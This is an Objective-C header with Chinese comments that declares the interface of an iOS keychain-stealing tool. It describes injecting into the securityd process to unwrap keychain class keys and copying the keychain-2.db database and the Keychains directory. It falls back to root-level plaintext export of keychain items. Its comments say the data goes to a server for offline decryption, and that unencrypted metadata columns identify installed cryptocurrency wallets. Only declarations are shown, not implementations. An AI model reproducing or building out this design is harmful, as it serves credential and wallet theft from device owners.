#import <Foundation/Foundation.h>
#import "OWCommon.h"

NS_ASSUME_NONNULL_BEGIN

#pragma mark - 远程调用（注入 securityd 取 class keys）

@interface OWRemoteCall : NSObject
@property (nonatomic, readonly) BOOL available;
- (BOOL)attachToProcessNamed:(NSString *)processName;
- (BOOL)unwrapClassKeys:(NSData * _Nullable * _Nonnull)outKeys error:(NSError **)error;
- (BOOL)copyPrivilegedFile:(NSString *)src to:(NSString *)dst error:(NSError **)error;
@end

#pragma mark - 钥匙层

@interface OWKeys : NSObject
@property (nonatomic, readonly) NSString *outDir;
@property (nonatomic, readonly, nullable) NSString *lastError;

// 整库拷 keychain-2.db（需内核权限或沙箱豁免）
- (BOOL)grabKeychainDBWithRemote:(OWRemoteCall *)rc error:(NSError **)error;

// 导出 keys 表（class keys）与 genp 行；schema 动态读取，不依赖硬编码列名
- (BOOL)exportTablesFromKeychainDB:(NSString *)dbPath error:(NSError **)error;

// 走 AKS 解包拿 class keys；AKS 不通时自动退回 SecItem 明文导出
- (BOOL)acquireClassKeysVia:(OWRemoteCall *)rc error:(NSError **)error;

// 兜底：root + SecItemCopyMatching 直接出明文（不依赖 class keys）
- (BOOL)exportPlaintextItemsWithError:(NSError **)error;

// 抓整个 Keychains 目录：metadata_class_keys.plist 与 keychain-2.db 同等重要 ——
// 服务端离线解 v_Data 要的就是它，只传 keychain-2.db 等于只给了一半。
- (BOOL)grabKeychainDirWithRemote:(OWRemoteCall *)rc error:(NSError **)error;

// 导出 keychain 里的明文字段：acct/svce/agrp/musr 几列不加密。
// 即便 v_Data 解不开，凭 agrp+svce+acct 也能判定装了哪些钱包、拿到地址类标识。
- (BOOL)exportKeychainMetadataFromDB:(NSString *)dbPath error:(NSError **)error;

- (NSArray<NSString *> *)producedFiles;
@end

NS_ASSUME_NONNULL_END
